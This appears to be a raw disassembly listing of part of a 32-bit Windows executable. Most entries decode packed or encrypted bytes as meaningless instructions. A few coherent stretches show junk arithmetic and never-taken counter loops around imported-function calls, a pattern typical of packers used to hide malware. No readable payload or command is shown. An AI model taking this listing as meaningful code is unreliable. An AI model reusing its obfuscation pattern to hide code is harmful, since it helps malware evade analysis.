  40598f:	inc    esi
  405990:	jno    0x4059d4
  405992:	loop   0x405918
  405994:	std    
  405995:	pop    esp
  405996:	jb     0x4059ff
  405998:	adc    BYTE PTR [eax+0x1d],ah
  40599b:	stos   DWORD PTR es:[edi],eax
  40599c:	ret    
  40599d:	or     al,0x8
  40599f:	and    BYTE PTR [edx],cl
  4059a1:	clc    
  4059a2:	retf   0xf246
  4059a5:	and    al,0xa7
  4059a7:	fistp  WORD PTR [ebp-0x6d0d1d86]
  4059ad:	popf   
  4059ae:	scas   eax,DWORD PTR es:[edi]
  4059af:	mul    BYTE PTR [ecx+0x12]
  4059b2:	xor    al,0x6e
  4059b4:	arpl   ax,sp
  4059b6:	inc    edx
  4059b7:	imul   eax,DWORD PTR [ecx+0x4a6ce98c],0x6145d05b
  4059c1:	aas    
  4059c2:	aam    0x2
  4059c4:	adc    DWORD PTR [ecx+0x4b25af6e],edi
  4059ca:	add    bl,BYTE PTR [esi-0x5a0e887b]
  4059d0:	sbb    DWORD PTR [esi+0x2b16c6c9],edx
  4059d6:	lods   eax,DWORD PTR cs:[esi]
  4059d8:	in     al,dx
  4059d9:	mov    dh,0x99
  4059db:	sbb    eax,0xd8b8cbbe
  4059e0:	dec    ecx
  4059e1:	aam    0x9e
  4059e3:	mov    ebx,0x906d247b
  4059e8:	push   edi
  4059e9:	add    esi,DWORD PTR [edi+edi*2-0x41]
  4059ed:	jbe    0x405a18
  4059ef:	outs   dx,DWORD PTR ds:[esi]
  4059f0:	icebp  
  4059f1:	hlt    
  4059f2:	repz mov eax,0xc26ef80c
  4059f8:	fisub  DWORD PTR [ebx]
  4059fa:	loopne 0x4059c4
  4059fc:	cmc    
  4059fd:	cmp    esp,DWORD PTR cs:[ebp+0x53faaa77]
  405a04:	es mov bl,0xa6
  405a07:	iret   
  405a08:	fucomi st,st(6)
  405a0a:	jb     0x4059ea
  405a0c:	jb     0x4059f3
  405a0e:	adc    ebp,DWORD PTR [edi+0x609e554]
  405a14:	loop   0x4059fb
  405a16:	in     al,0x3e
  405a18:	(bad)  
  405a19:	in     eax,0xc6
  405a1b:	push   cs
  405a1c:	pop    ds
  405a1d:	fdiv   QWORD PTR [eax]
  405a1f:	or     bl,BYTE PTR [eax+0x34]
  405a22:	daa    
  405a23:	fs mov cl,0x9c
  405a26:	mov    es,WORD PTR [ebp+edx*2-0x36bb26]
  405a2d:	cmp    bh,BYTE PTR [ebp+0x39]
  405a30:	cs (bad) 
  405a32:	int3   
  405a33:	pop    ss
  405a34:	(bad)  
  405a35:	sub    eax,0xc74bafb7
  405a3a:	xchg   edx,eax
  405a3b:	repnz cli 
  405a3d:	and    al,0xb6
  405a3f:	pop    ss
  405a40:	icebp  
  405a41:	jle    0x4059dc
  405a43:	sbb    ebx,ecx
  405a45:	add    edx,DWORD PTR [ecx-0x7fad3130]
  405a4b:	sub    BYTE PTR [edi],dl
  405a4d:	add    ch,BYTE PTR [edi]
  405a4f:	lock mov dh,0xd
  405a52:	fistp  DWORD PTR [esi-0x12]
  405a55:	lea    ecx,[ebx]
  405a57:	push   0xcb16790e
  405a5c:	shr    BYTE PTR [edx+0x43],1
  405a5f:	and    eax,0x88371df4
  405a64:	test   al,0x2b
  405a66:	lods   al,BYTE PTR cs:[esi]
  405a68:	push   ss
  405a69:	int3   
  405a6a:	ds retf 0xa265
  405a6e:	aad    0x2
  405a70:	xor    al,0xbb
  405a72:	pop    ds
  405a73:	pop    esp
  405a74:	pushf  
  405a75:	pop    esi
  405a76:	in     eax,0x96
  405a78:	cmp    BYTE PTR [eax-0x5a],0xd7
  405a7c:	mov    WORD PTR [ebp+edi*4+0x59],?
  405a80:	rcr    ah,0x3d
  405a83:	rol    bl,1
  405a85:	call   0xf7576a7
  405a8a:	jle    0x405a1e
  405a8c:	jp     0x405aa6
  405a8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a8f:	xor    al,0x28
  405a91:	aaa    
  405a92:	mov    ds:0x9beb5a67,eax
  405a97:	adc    esp,DWORD PTR [edx]
  405a99:	pop    ebx
  405a9a:	out    dx,al
  405a9b:	frstpm(287 only) 
  405a9d:	test   al,0xf1
  405a9f:	adc    dl,BYTE PTR [edx-0x47]
  405aa2:	and    eax,0x21a0045c
  405aa7:	imul   ebp,DWORD PTR [ecx+eiz*8+0x68],0xd4273150
  405aaf:	mov    WORD PTR [eax],es
  405ab1:	test   BYTE PTR [edx-0x58],dh
  405ab4:	loop   0x405b11
  405ab6:	sub    DWORD PTR [ecx-0x7e826966],eax
  405abc:	xor    al,al
  405abe:	xchg   ebx,eax
  405abf:	mov    edi,0x9801aa50
  405ac4:	push   edx
  405ac5:	outs   dx,DWORD PTR ds:[esi]
  405ac6:	(bad)  
  405ac7:	outs   dx,BYTE PTR ds:[esi]
  405ac8:	cwde   
  405ac9:	add    DWORD PTR ds:0x91ad78e,ebp
  405acf:	jmp    0x405a7f
  405ad1:	pop    eax
  405ad2:	mov    dl,0xeb
  405ad4:	pushf  
  405ad5:	adc    eax,DWORD PTR [ebx+0x39]
  405ad8:	call   0x1d59:0x24ddc898
  405adf:	aad    0x45
  405ae1:	jecxz  0x405aef
  405ae3:	es adc eax,0x575b9b1a
  405ae9:	xor    al,0x60
  405aeb:	mov    ecx,0x8ddc0992
  405af0:	pop    ds
  405af1:	int3   
  405af2:	lahf   
  405af3:	imul   esp,DWORD PTR ss:[ecx+ebp*1],0x3c
  405af8:	inc    esi
  405af9:	push   0x21
  405afb:	sub    BYTE PTR [ebx+0x5f],cl
  405afe:	and    eax,DWORD PTR fs:0x98210c6e
  405b05:	pusha  
  405b06:	sti    
  405b07:	fldenv [edi]
  405b09:	addr16 adc al,0xb2
  405b0c:	lds    ebp,FWORD PTR [edi-0x10]
  405b0f:	xor    edx,ecx
  405b11:	push   0x3fac0898
  405b16:	inc    ecx
  405b17:	shl    BYTE PTR [edx+0x6e],0x40
  405b1b:	pop    ecx
  405b1c:	or     BYTE PTR [eax],ch
  405b1e:	addr16 pop ecx
  405b20:	and    al,0x74
  405b22:	push   cs
  405b23:	dec    eax
  405b24:	pop    eax
  405b25:	scas   al,BYTE PTR es:[edi]
  405b26:	sbb    al,BYTE PTR [esi-0x49051795]
  405b2c:	pushf  
  405b2d:	and    esp,DWORD PTR [ebp-0x6a]
  405b30:	cs or  ecx,edx
  405b33:	stc    
  405b34:	pmulhw mm0,QWORD PTR [ecx]
  405b37:	push   edx
  405b38:	lods   al,BYTE PTR ds:[esi]
  405b39:	push   edx
  405b3a:	or     al,0x25
  405b3c:	jno    0x405b4c
  405b3e:	stos   DWORD PTR es:[edi],eax
  405b3f:	mov    ds:0xb8120e1f,eax
  405b44:	push   edx
  405b45:	mov    BYTE PTR [ebx],ch
  405b47:	dec    esi
  405b48:	mov    al,0xc4
  405b4a:	cs cmp al,0xd0
  405b4d:	mov    ebp,0x643d026c
  405b52:	xor    ebp,esi
  405b54:	pop    ss
  405b55:	sbb    al,0xf6
  405b57:	outs   dx,BYTE PTR ds:[esi]
  405b58:	int    0xa7
  405b5a:	sbb    DWORD PTR ds:0xd2f5d98e,edx
  405b60:	sahf   
  405b61:	mov    eax,ds:0xbbcbc0c0
  405b66:	dec    edi
  405b67:	imul   edx,DWORD PTR [edi-0x3c618a0b],0xffffffd0
  405b6e:	push   edi
  405b6f:	iret   
  405b70:	scas   eax,DWORD PTR es:[edi]
  405b71:	xor    BYTE PTR [ecx-0x954363b],dl
  405b77:	xor    eax,0xf533f5ee
  405b7c:	dec    edi
  405b7d:	ficom  DWORD PTR [esi]
  405b7f:	or     al,0x87
  405b81:	fsubr  st(6),st
  405b83:	cmp    BYTE PTR [edi-0x16],dh
  405b86:	xchg   edi,eax
  405b87:	jg     0x405bc9
  405b89:	out    0xfe,al
  405b8b:	xchg   BYTE PTR [ebx],bl
  405b8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b8e:	data16 loopne 0x405b31
  405b91:	test   BYTE PTR [ebx+0x45],cl
  405b94:	mov    al,0xd4
  405b96:	dec    edi
  405b97:	cmp    eax,0xb8beaf84
  405b9c:	push   cs
  405b9d:	adc    esp,DWORD PTR [eax]
  405b9f:	mov    DWORD PTR [edx-0x79],esi
  405ba2:	fisttp QWORD PTR [ebp-0x80]
  405ba5:	sbb    ebx,DWORD PTR [ebx]
  405ba7:	mov    DWORD PTR [edi+edx*8+0x7bc3d00e],eax
  405bae:	rol    DWORD PTR [esi+0x3d],cl
  405bb1:	mov    bh,0x83
  405bb3:	sar    BYTE PTR [ecx-0x5a],1
  405bb6:	mul    DWORD PTR [edi]
  405bb8:	pop    ebp
  405bb9:	pop    ds
  405bba:	or     al,0xe0
  405bbc:	cwde   
  405bbd:	rcr    BYTE PTR [ecx],0x58
  405bc0:	js     0x405c39
  405bc2:	cmp    al,0x94
  405bc4:	adc    al,0x97
  405bc6:	jg     0x405b82
  405bc8:	add    DWORD PTR [eax],eax
  405bca:	pushf  
  405bcb:	ret    0x64b2
  405bce:	aad    0xe0
  405bd0:	aaa    
  405bd1:	sar    dl,0xcc
  405bd4:	call   0x95ac04d6
  405bd9:	ret    
  405bda:	rcr    BYTE PTR [esp+edx*1-0x5504c458],1
  405be1:	mov    BYTE PTR [esi],bl
  405be3:	dec    edi
  405be4:	mov    edi,DWORD PTR [ecx]
  405be6:	jge    0x405c26
  405be8:	stc    
  405be9:	lods   al,BYTE PTR ds:[esi]
  405bea:	xor    esp,edi
  405bec:	cmp    al,0xa4
  405bee:	pop    ss
  405bef:	je     0x405c09
  405bf1:	mov    ds:0x9e8ff1ff,eax
  405bf6:	jl     0x405b81
  405bf8:	cli    
  405bf9:	inc    edi
  405bfa:	fisubr DWORD PTR [eax]
  405bfc:	jbe    0x405b98
  405bfe:	ret    0x6eb0
  405c01:	jns    0x405b94
  405c03:	pusha  
  405c04:	test   eax,ebp
  405c06:	push   ebp
  405c07:	xlat   BYTE PTR ds:[ebx]
  405c08:	pop    ss
  405c09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c0a:	pop    ecx
  405c0b:	ins    BYTE PTR es:[edi],dx
  405c0c:	mov    al,0x7
  405c0e:	sub    DWORD PTR [ebp+0x1eb0abf0],edx
  405c14:	lds    eax,FWORD PTR [ecx-0x25]
  405c17:	sub    DWORD PTR [edi],ebp
  405c19:	iret   
  405c1a:	les    esi,FWORD PTR [edx-0x38a7f27e]
  405c20:	and    DWORD PTR [ebp-0x18],esi
  405c23:	mov    cl,0x14
  405c25:	cmp    ah,BYTE PTR [edi]
  405c27:	adc    al,0x4
  405c29:	push   edx
  405c2a:	std    
  405c2b:	mov    eax,ds:0xf2e28956
  405c30:	mov    ch,BYTE PTR [edi-0x66]
  405c33:	jne    0x405bef
  405c35:	outs   dx,DWORD PTR ds:[esi]
  405c36:	push   esp
  405c37:	sub    BYTE PTR [esi],bl
  405c39:	lahf   
  405c3a:	mov    bl,0xf9
  405c3c:	xor    DWORD PTR [edi+eiz*8+0x43ccef8],ebp
  405c43:	ss call 0x6aeb:0x1e9bc59a
  405c4b:	cmc    
  405c4c:	jne    0x405cc8
  405c4e:	xchg   esi,eax
  405c4f:	dec    eax
  405c50:	cdq    
  405c51:	cdq    
  405c52:	sub    bh,BYTE PTR [esi-0x2d]
  405c55:	out    0x7,eax
  405c57:	aam    0x7b
  405c59:	fmul   QWORD PTR [edx+ebp*8+0x16d46346]
  405c60:	mov    al,ds:0x123a08fd
  405c65:	out    0x4a,al
  405c67:	cmp    eax,0xa7bd0d2f
  405c6c:	fisttp WORD PTR [edi+0x24d3515b]
  405c72:	(bad)  
  405c73:	sahf   
  405c74:	icebp  
  405c75:	call   0x5dfe:0x6fed0f28
  405c7c:	icebp  
  405c7d:	hlt    
  405c7e:	mov    bh,0x22
  405c80:	xchg   edi,eax
  405c81:	pop    ecx
  405c82:	lahf   
  405c83:	push   edi
  405c84:	mov    al,ds:0x2357d17a
  405c89:	std    
  405c8a:	mov    dh,0x21
  405c8c:	imul   edi,DWORD PTR [ebx-0x2a],0xd263caf6
  405c93:	mov    ch,0x36
  405c95:	push   ebp
  405c96:	scas   al,BYTE PTR es:[edi]
  405c97:	mov    edx,0x4ad903e3
  405c9c:	push   0x6fb32725
  405ca1:	call   0xb06b:0x6abef5a
  405ca8:	sbb    bh,ch
  405caa:	rol    esp,1
  405cac:	pop    ds
  405cad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cae:	lods   al,BYTE PTR ds:[esi]
  405caf:	xchg   ebp,eax
  405cb0:	test   BYTE PTR [ebp+0x29],dh
  405cb3:	nop
  405cb4:	dec    eax
  405cb5:	sub    dl,BYTE PTR [ecx-0x625ebb47]
  405cbb:	out    0xdf,al
  405cbd:	ss fs inc edi
  405cc0:	popf   
  405cc1:	loop   0x405d30
  405cc3:	jg     0x405d2d
  405cc5:	or     eax,0x3b9d9a3e
  405cca:	enter  0x850f,0x12
  405cce:	add    al,0x0
  405cd0:	add    BYTE PTR [ecx],al
  405cd2:	adc    eax,0x43463f
  405cd7:	mov    ax,WORD PTR [ebp-0x8]
  405cdb:	and    DWORD PTR ds:0x434653,0x43467b
  405ce5:	mov    ecx,0x8a38
  405cea:	sub    DWORD PTR ds:0x43470f,0x30d0
  405cf4:	xor    ax,cx
  405cf7:	or     ecx,0x3ba0
  405cfd:	mov    ecx,0x3afe
  405d02:	and    DWORD PTR ds:0x4346c7,0x6a78
  405d0c:	add    ax,cx
  405d0f:	mov    DWORD PTR ds:0x434647,0x12
  405d19:	cmp    DWORD PTR ds:0x434647,0x0
  405d20:	je     0x405d51
  405d26:	cmp    DWORD PTR ds:0x434647,0x13
  405d2d:	jne    0x405d3f
  405d33:	push   DWORD PTR [ebp-0x1c]
  405d36:	push   DWORD PTR [ebp-0x10]
  405d39:	call   DWORD PTR ds:0x413284
  405d3f:	mov    ecx,DWORD PTR ds:0x434647
  405d45:	dec    ecx
  405d46:	mov    DWORD PTR ds:0x434647,ecx
  405d4c:	jmp    0x405d19
  405d51:	mov    ecx,DWORD PTR [ebp+0x8]
  405d54:	movzx  eax,ax
  405d57:	not    eax
  405d59:	and    eax,DWORD PTR [ecx]
  405d5b:	mov    ecx,DWORD PTR [ebp+0x8]
  405d5e:	mov    DWORD PTR [ecx],eax
  405d60:	jmp    0x405d6c
  405d65:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  405d6c:	mov    ax,WORD PTR [ebp-0x8]
  405d70:	push   DWORD PTR [ebp+0x8]
  405d73:	call   0x4060e7
  405d78:	test   eax,eax
  405d7a:	jmp    0x4060dd
  405d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d80:	jb     0x405db6
  405d82:	push   ebp
  405d83:	cld    
  405d84:	pop    ebp
  405d85:	gs jae 0x405d28
  405d88:	call   0xd3041bd6
  405d8d:	shl    BYTE PTR gs:[ebp-0x3b8181c4],1
  405d94:	jns    0x405e14
  405d96:	jle    0x405d4a
  405d98:	xor    al,0x25
  405d9a:	jb     0x405dc2
  405d9c:	mov    eax,?
  405d9e:	in     eax,0xf8
  405da0:	ss aaa 
  405da2:	fldcw  WORD PTR [ebp+0x4582c0d3]
  405da8:	mov    ah,0x4e
  405daa:	sbb    BYTE PTR [ebx-0x35],bl
  405dad:	out    0x46,eax
  405daf:	dec    eax
  405db0:	repnz and ebx,ecx
  405db3:	push   edx
  405db4:	jne    0x405da1
  405db6:	jmp    0x431:0x28c0fd71
  405dbd:	in     al,0xc6
  405dbf:	xchg   BYTE PTR [eax-0x2d7d4fb],ah
  405dc5:	cdq    
  405dc6:	add    BYTE PTR [edx-0x1767783a],dh
  405dcc:	popf   
  405dcd:	pop    ebp
  405dce:	xchg   esp,eax
  405dcf:	shl    DWORD PTR [edx-0x38],1
  405dd2:	mov    al,ds:0x56acf386
  405dd7:	(bad)  
  405dd8:	cs mov al,0xaa
  405ddb:	mov    ah,0xce
  405ddd:	dec    esi
  405dde:	ret    
  405ddf:	adc    al,BYTE PTR [edx]
  405de1:	mov    edx,DWORD PTR [esi-0x27b72016]
  405de7:	push   ebx
  405de8:	fs dec esp
  405dea:	and    DWORD PTR [ebx+ebx*1-0x5d77cc5f],esi
  405df1:	push   cs
  405df2:	lods   al,BYTE PTR ds:[esi]
  405df3:	xchg   esi,eax
  405df4:	pop    esp
  405df5:	inc    ecx
  405df6:	aam    0x61
  405df8:	arpl   WORD PTR [ecx],di
  405dfa:	cmp    al,cl
  405dfc:	adc    eax,esp
  405dfe:	cmp    eax,0xeb529a90
  405e03:	fcomp  QWORD PTR [edx+0x5cd5112]
  405e09:	and    DWORD PTR es:[eax-0x1d2eee52],ebx
  405e10:	stos   DWORD PTR es:[edi],eax
  405e11:	fstp   TBYTE PTR [esi-0x30ba8bb9]
  405e17:	mov    dl,0xbe
  405e19:	mov    ecx,0x339325f2
  405e1e:	sbb    edi,DWORD PTR [ecx+ebp*2]
  405e21:	mov    edx,0x305fb3d2
  405e26:	jecxz  0x405dab
  405e28:	mov    ebx,0x82f36fd5
  405e2d:	xor    eax,0xdbea8518
  405e32:	mov    al,0xa7
  405e34:	ret    0x7943
  405e37:	mov    ch,0xf7
  405e39:	shr    DWORD PTR [ecx-0x68],0x4b
  405e3d:	adc    BYTE PTR ds:0xfb053cfa,al
  405e43:	sub    eax,0x8adaaaf1
  405e48:	push   ecx
  405e49:	jl     0x405e3e
  405e4b:	adc    ecx,DWORD PTR [ecx]
  405e4d:	sub    edi,DWORD PTR ds:0xa8820563
  405e53:	push   es
  405e54:	mov    dh,0x6c
  405e56:	int    0xd8
  405e58:	pop    edi
  405e59:	push   ebx
  405e5a:	adc    dl,BYTE PTR [esi]
  405e5c:	inc    cx
  405e5e:	pop    edx
  405e5f:	addr16 mov esi,0x3cbd7ade
  405e65:	pushf  
  405e66:	pop    ebx
  405e67:	fdivr  QWORD PTR [eax+ebp*4-0x76c6787c]
  405e6e:	mov    bh,0xf4
  405e70:	in     eax,dx
  405e71:	test   eax,0x57e43660
  405e76:	test   al,0xa5
  405e78:	ret    
  405e79:	loopne 0x405e96
  405e7b:	mov    esi,DWORD PTR [ebp+0x6b93541b]
  405e81:	or     eax,0x50e15aa1
  405e86:	inc    eax
  405e87:	inc    ecx
  405e88:	fnstsw WORD PTR [ecx-0x4c560046]
  405e8e:	js     0x405f07
  405e90:	iret   
  405e91:	pop    ds
  405e92:	mov    al,0xfd
  405e94:	adc    BYTE PTR [edx+0x105ca4e8],0x67
  405e9b:	pop    eax
  405e9c:	(bad)  
  405e9d:	in     eax,0xbe
  405e9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ea0:	pop    ebp
  405ea1:	adc    ch,BYTE PTR [eax+0x14]
  405ea4:	mov    bh,0x67
  405ea6:	adc    al,0xd
  405ea8:	adc    DWORD PTR [edx],0xffffffbe
  405eab:	and    al,0x34
  405eae:	dec    edi
  405eb0:	fbstp  TBYTE PTR [eax]
  405eb2:	xor    bl,0xa4
  405eb5:	sub    edx,DWORD PTR [ecx+0xe88bde1]
  405ebb:	xor    ah,BYTE PTR [ebp+0x64]
  405ebe:	xchg   ebp,eax
  405ebf:	test   eax,0x98b37864
  405ec4:	adc    eax,0x2b393d4
  405ec9:	adc    bh,ch
  405ecb:	jb     0x405e60
  405ecd:	das    
  405ece:	sbb    eax,0x9b30ffa
  405ed3:	push   eax
  405ed4:	mov    ch,0xcf
  405ed6:	or     DWORD PTR [eax+0x57c3bb2],ebp
  405edc:	jmp    0x405ed1
  405ede:	inc    ecx
  405edf:	dec    ebp
  405ee0:	mov    cl,0xea
  405ee2:	pop    esp
  405ee3:	mov    BYTE PTR [esi-0x6832abe3],bl
  405ee9:	xlat   BYTE PTR ds:[ebx]
  405eea:	push   cs
  405eeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405eec:	sub    eax,0x55b3aa9a
  405ef1:	cmp    dh,bl
  405ef3:	stos   DWORD PTR es:[edi],eax
  405ef4:	add    BYTE PTR [edx+eiz*1-0x27],ah
  405ef8:	fbld   TBYTE PTR ds:0x20c2323d
  405efe:	xor    DWORD PTR [ebx],ebx
  405f00:	mov    ds:0x8f90402a,eax
  405f05:	jo     0x405f07
  405f07:	daa    
  405f08:	inc    ebp
  405f09:	push   ebx
  405f0a:	out    dx,al
  405f0b:	xlat   BYTE PTR ds:[ebx]
  405f0c:	mov    dl,0x46
  405f0e:	(bad)  
  405f0f:	cmc    
  405f10:	retf   
  405f11:	fmul   DWORD PTR [esi]
  405f13:	enter  0xcbfe,0x75
  405f17:	mov    edi,0xdc106dad
  405f1c:	lods   al,BYTE PTR ds:[esi]
  405f1d:	inc    edi
  405f1e:	and    eax,0x67c8e174
  405f23:	jno    0x405ede
  405f25:	ja     0x405ed6
  405f27:	in     eax,0x2c
  405f29:	aam    0x7d
  405f2b:	das    
  405f2c:	js     0x405f85
  405f2e:	sbb    edx,DWORD PTR [esi]
  405f30:	sub    BYTE PTR [edi],dh
  405f32:	pop    edx
  405f33:	mov    cl,0x32
  405f35:	push   ss
  405f36:	bound  ebx,QWORD PTR [eax-0x7c]
  405f39:	or     ebp,ecx
  405f3b:	outs   dx,DWORD PTR ds:[esi]
  405f3c:	fs jae 0x405ede
  405f3f:	xchg   edx,eax
  405f40:	js     0x405f52
  405f42:	inc    esi
  405f43:	jg     0x405f70
  405f45:	xchg   BYTE PTR [edx+0x464f318d],al
  405f4b:	dec    esi
  405f4c:	adc    BYTE PTR ds:0xe9eb420a,dl
  405f52:	mov    ds:0xe5241df3,eax
  405f57:	(bad)  
  405f58:	icebp  
  405f59:	dec    edx
  405f5a:	out    dx,al
  405f5b:	jecxz  0x405f3c
  405f5d:	pop    ds
  405f5e:	mov    ecx,0x6e4fcf7b
  405f63:	sbb    eax,0x41a1d257
  405f68:	xor    BYTE PTR [esi+0x59],dl
  405f6b:	shl    DWORD PTR [ebx-0x72],cl
  405f6e:	out    0x36,eax
  405f70:	icebp  
  405f71:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f73:	inc    eax
  405f74:	or     eax,0xc1fce233
  405f79:	mov    es:0xfcdee46d,eax
  405f7f:	and    bh,ah
  405f81:	mov    ecx,0x7ef54848
  405f86:	int3   
  405f87:	fsubr  QWORD PTR [edx-0x7d]
  405f8a:	cmp    BYTE PTR ds:0x152f8d88,cl
  405f90:	stos   DWORD PTR es:[edi],eax
  405f91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f92:	mov    esp,0x8901c0b2
  405f97:	ss push ebx
  405f99:	sub    cl,BYTE PTR [ecx+eiz*4+0x41]
  405f9d:	std    
  405f9e:	(bad)  [ecx]
  405fa0:	stc    
  405fa1:	lods   eax,DWORD PTR ds:[esi]
  405fa2:	push   ss
  405fa3:	out    dx,eax
  405fa4:	dec    edi
  405fa5:	repnz aam 0x3d
  405fa8:	pop    ebx
  405fa9:	loopne 0x406029
  405fab:	in     al,dx
  405fac:	(bad)  
  405fad:	xor    DWORD PTR [esp+ebp*4-0x15],eax
  405fb1:	adc    BYTE PTR ds:[ebp+0xdc51af2],0xcc
  405fb9:	jge    0x405f80
  405fbb:	push   0xffffffef
  405fbd:	adc    al,0x26
  405fbf:	dec    ecx
  405fc0:	and    eax,0xa299521f
  405fc5:	sub    esp,DWORD PTR [ebp-0x17]
  405fc8:	push   ecx
  405fc9:	test   edi,0x95ebc61b
  405fcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fd0:	push   ebx
  405fd1:	inc    ebp
  405fd2:	dec    edx
  405fd3:	ficom  DWORD PTR [edi+0x6d]
  405fd6:	sub    BYTE PTR [ebp+0x56],bl
  405fd9:	mov    esp,0x870687c0
  405fde:	shl    cl,1
  405fe0:	faddp  st(7),st
  405fe2:	or     dl,ch
  405fe4:	outs   dx,BYTE PTR ds:[esi]
  405fe5:	out    dx,eax
  405fe6:	or     eax,0x553c4c5b
  405feb:	mov    edi,0x18a72d54
  405ff0:	test   eax,0xf880186f
  405ff5:	and    DWORD PTR [edx-0x7e],ebx
  405ff8:	mov    gs,WORD PTR [eax]
  405ffa:	fbstp  TBYTE PTR [ebp-0x739811e3]
  406000:	pop    ebx
  406001:	pop    ss
  406002:	cmp    bh,BYTE PTR [ecx-0x2df70427]
  406008:	rol    dh,cl
  40600a:	call   0x48e3b7ce
  40600f:	stos   DWORD PTR es:[edi],eax
  406010:	pop    eax
  406011:	jl     0x406075
  406013:	call   0x8e5a:0x82e95d11
  40601a:	pop    edx
  40601b:	cdq    
  40601c:	jg     0x40608c
  40601e:	jecxz  0x405ffe
  406020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406021:	or     ebp,DWORD PTR [eax+ebp*8]
  406024:	je     0x4060a5
  406026:	dec    edx
  406027:	dec    esp
  406028:	pop    ds
  406029:	add    BYTE PTR ds:0xc42a60c0,bh
  40602f:	mov    WORD PTR [edi-0x31],?
  406032:	popa   
  406033:	ja     0x40604a
  406035:	inc    esi
  406036:	xor    bl,al
  406038:	mov    ecx,eax
  40603a:	xor    eax,0x2451ab03
  40603f:	int    0xf1
  406041:	arpl   WORD PTR [esi],cx
  406043:	fisubr WORD PTR [edi+0x2b7431df]
  406049:	fadd   st,st(0)
  40604b:	ror    BYTE PTR [esp+ecx*2],0x99
  40604f:	push   esi
  406050:	pusha  
  406051:	sbb    BYTE PTR [ecx+eiz*2+0x657e331a],al
  406058:	lods   al,BYTE PTR ds:[esi]
  406059:	jmp    0x406008
  40605b:	jno    0x40601e
  40605d:	or     bh,dh
  40605f:	xchg   esp,eax
  406060:	xchg   DWORD PTR [eax],ebp
  406062:	test   al,0xfb
  406064:	jg     0x40606f
  406066:	stc    
  406067:	mov    al,ds:0xd1c3a357
  40606c:	adc    eax,0x75b5bbb3
  406071:	or     ecx,eax
  406073:	das    
  406074:	and    cl,BYTE PTR [edx+0x5e0a903b]
  40607a:	cdq    
  40607b:	out    0xf4,eax
  40607d:	pop    edx
  40607e:	repz dec eax
  406080:	mov    edi,0x14f1219a
  406085:	pop    eax
  406086:	and    ecx,ebx
  406088:	xchg   edi,eax
  406089:	js     0x4060a8
  40608b:	mov    ch,0x1c
  40608d:	push   ecx
  40608e:	dec    edi
  40608f:	loopne 0x4060c5
  406091:	dec    ebp
  406092:	shr    BYTE PTR [edi-0x26],1
  406095:	jecxz  0x406032
  406097:	cmp    al,0xd
  406099:	xchg   DWORD PTR [esi+0x642e2171],eax
  40609f:	cmp    esp,esp
  4060a1:	adc    eax,0xd8c0c045
  4060a6:	cmp    ebx,ebx
  4060a8:	lods   al,BYTE PTR ds:[esi]
  4060a9:	inc    edx
  4060aa:	fadd   QWORD PTR [ecx+0x60]
  4060ad:	dec    esi
  4060ae:	mov    ah,0xd1
  4060b0:	mov    al,ds:0xf1c8da51
  4060b5:	xchg   ecx,eax
  4060b6:	js     0x4060b5
  4060b8:	and    ebp,DWORD PTR [ebx]
  4060ba:	cld    
  4060bb:	jmp    0x193a:0x9921394d
  4060c2:	shl    BYTE PTR [ecx+0x60b5718b],cl
  4060c8:	pop    ecx
  4060c9:	imul   edx,DWORD PTR [ebx],0xffffffdf
  4060cc:	mov    ah,0xb5
  4060ce:	in     al,dx
  4060cf:	fs out 0x91,eax
  4060d2:	lahf   
  4060d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060d4:	jae    0x406150
  4060d6:	out    0xe4,eax
  4060d8:	pop    esp
  4060d9:	enter  0x3489,0x79
  4060dd:	je     0x405d65
  4060e3:	leave  
  4060e4:	ret    0x4
  4060e7:	push   ebp
  4060e8:	mov    ebp,esp
  4060ea:	sub    esp,0x2c
  4060ed:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  4060f4:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  4060fb:	mov    ecx,DWORD PTR ds:0x43466f
  406101:	mov    eax,ds:0x43471b
  406106:	sub    eax,ecx
  406108:	add    ecx,DWORD PTR [ecx+eax*1]
  40610b:	mov    eax,0x9577
  406110:	and    DWORD PTR ds:0x434653,0x0
  40611a:	jmp    0x40612c
  40611f:	mov    ecx,DWORD PTR ds:0x434653
  406125:	inc    ecx
  406126:	mov    DWORD PTR ds:0x434653,ecx
  40612c:	cmp    DWORD PTR ds:0x434653,0x15
  406133:	jae    0x40615a
  406139:	cmp    DWORD PTR ds:0x434653,0x17
  406140:	jne    0x40614f
  406146:	push   DWORD PTR [ebp-0x10]
  406149:	call   DWORD PTR ds:0x4130c0
  40614f:	jmp    0x40611f
  406154:	adc    DWORD PTR ds:0x434637,edx
  40615a:	mov    WORD PTR [ebp-0x4],ax
  40615e:	and    DWORD PTR ds:0x43467b,0x0
  406168:	mov    ecx,DWORD PTR ds:0x43467b
  40616e:	inc    ecx
  40616f:	mov    DWORD PTR ds:0x43467b,ecx
  406175:	cmp    DWORD PTR ds:0x43467b,0x5
  40617c:	jne    0x40618b
  406182:	push   DWORD PTR [ebp-0x10]
  406185:	call   DWORD PTR ds:0x4133fc
  40618b:	cmp    DWORD PTR ds:0x43467b,0x4
  406192:	jne    0x4061a7
  406198:	xor    ecx,ecx
  40619a:	or     ecx,DWORD PTR ds:0x43467b
  4061a0:	inc    ecx
  4061a1:	mov    DWORD PTR ds:0x43467b,ecx
  4061a7:	cmp    DWORD PTR ds:0x43467b,0x1f
  4061ae:	jb     0x406168
  4061b4:	jmp    0x4065a2
  4061b9:	and    bl,al
  4061bb:	ss cmp ch,bh
  4061be:	cmc    
  4061bf:	lock jecxz 0x406145
  4061c2:	sahf   
  4061c3:	rol    ebp,1
  4061c5:	scas   eax,DWORD PTR es:[edi]
  4061c6:	in     eax,dx
  4061c7:	mov    edx,0x7e3f736a
  4061cc:	jle    0x40621d
